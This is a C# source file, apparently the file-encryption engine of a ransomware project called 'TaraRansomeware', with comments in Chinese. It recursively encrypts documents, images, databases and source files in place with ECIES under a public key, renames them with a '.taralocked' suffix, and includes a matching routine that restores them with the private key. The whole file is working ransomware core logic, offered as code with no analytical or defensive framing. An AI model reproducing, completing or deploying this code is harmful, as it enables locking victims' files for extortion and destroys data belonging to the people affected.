using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using TaraRansomeware.Utilities;

namespace TaraRansomeware.Engines
{
    internal class FileProcessEngine
    {
        /// <summary>
        /// 加密文件的后缀名
        /// </summary>
        public static readonly string lockSuffix = ".taralocked";

        /// <summary>
        /// ECIES加密引擎
        /// </summary>
        private EciesCipherEngine engine = null;

        /// <summary>
        /// 构造处理器
        /// </summary>
        /// <param name="guid">用户机器的唯一识别码</param>
        public FileProcessEngine(byte[] guid)
        {
            engine = new EciesCipherEngine(guid);
        }

        /// <summary>
        /// 文件夹加密
        /// </summary>
        /// <param name="cipPubKey">加密公钥</param>
        /// <param name="location">文件夹位置</param>
        public void EncryptDirectory(ECPublicKeyParameters cipPubKey, string location)
        {
            string[] validExtensions = {
                ".txt", ".md", ".tex", ".rst",
                ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
                ".jpg", ".png", ".psd",
                ".csv", ".sql", ".mdb", ".sln",
                ".php", ".asp", ".aspx", ".html", ".xml", ".py", ".js"
            };

            try
            {
                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);

                Parallel.ForEach(files, (filePath) =>
                {
                    string extension = Path.GetExtension(filePath);
                    if (validExtensions.Contains(extension))
                    {
                        EncryptFile(cipPubKey, Path.GetFullPath(filePath));
                        Debug.WriteLine(Path.GetFullPath(filePath));
                    }
                });

                Parallel.ForEach(childDirectories, (subDir) =>
                {
                    EncryptDirectory(cipPubKey, Path.GetFullPath(subDir));
                });
            }
            catch (System.UnauthorizedAccessException e)
            {
                Console.WriteLine(e.Message);
            }
        }

        /// <summary>
        /// 文件夹解密
        /// </summary>
        /// <param name="cipPrivKey">解密私钥</param>
        /// <param name="location">文件夹位置</param>
        public void DecryptDirectory(ECPrivateKeyParameters cipPrivKey, string location)
        {
            string validExtension = lockSuffix;

            try
            {
                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);

                Parallel.ForEach(files, (filePath) =>
                {
                    string extension = Path.GetExtension(filePath);
                    if (extension == validExtension)
                    {
                        Console.WriteLine(Path.GetFullPath(filePath));
                        RestoreFile(cipPrivKey, Path.GetFullPath(filePath));
                    }
                });

                Parallel.ForEach(childDirectories, (subDir) =>
                {
                    DecryptDirectory(cipPrivKey, Path.GetFullPath(subDir));
                });
            }
            catch (System.UnauthorizedAccessException e)
            {
                Console.WriteLine(e.Message);
            }
        }

        /// <summary>
        /// 文件加密
        /// </summary>
        /// <param name="pubKey">椭圆曲线公钥</param>
        /// <param name="filePath">文件路径</param>
        /// <returns>文件加密后的文件名</returns>
        public string EncryptFile(ECPublicKeyParameters pubKey, string filePath)
        {
            byte[] cleartext = File.ReadAllBytes(filePath);

            AsymmetricCipherKeyPair Rand = KeyUtils.GenerateKeyPair();

            byte[] ciphertext = engine.Encrypt(
                (ECPublicKeyParameters)pubKey,
                (ECPrivateKeyParameters)Rand.Private,
                cleartext
            );

            using (FileStream fs = File.OpenWrite(filePath))
            {
                byte[] hexPubKey = KeyUtils.EncodeECPublicKey((ECPublicKeyParameters)Rand.Public);
                Debug.Assert(
                    hexPubKey.Length == 33,
                    "Encoded EC public key must be in hex compressed format"
                );

                fs.Write(hexPubKey, 0, hexPubKey.Length);
                fs.Write(ciphertext, 0, ciphertext.Length);
            }

            string lockedPath = filePath + lockSuffix;
            File.Move(filePath, lockedPath);

            return lockedPath;
        }

        /// <summary>
        /// 文件恢复
        /// </summary>
        /// <param name="privKey">椭圆曲线私钥</param>
        /// <param name="filePath">文件路径</param>
        /// <returns>文件解密后的文件名</returns>
        public string RestoreFile(ECPrivateKeyParameters privKey, string filePath)
        {
            byte[] content = File.ReadAllBytes(filePath);

            Debug.Assert(
               content.Length >= 33,
               "Cannot retrieve an entire public key from " + filePath
            );

            byte[] hexPubRand = new byte[33];
            Array.Copy(content, 0, hexPubRand, 0, 33);
            ECPublicKeyParameters pubRand = KeyUtils.DecodeECPublicKey(hexPubRand);

            byte[] ciphertext = new byte[content.Length - 33];
            Array.Copy(content, 33, ciphertext, 0, content.Length - 33);


            byte[] cleartext = engine.Decrypt(
                (ECPrivateKeyParameters)privKey,
                (ECPublicKeyParameters)pubRand,
                ciphertext
            );

            File.WriteAllBytes(filePath, cleartext);

            string originPath = filePath.Replace(lockSuffix, "");
            File.Move(filePath, originPath);
            return originPath;
        }
    }
}

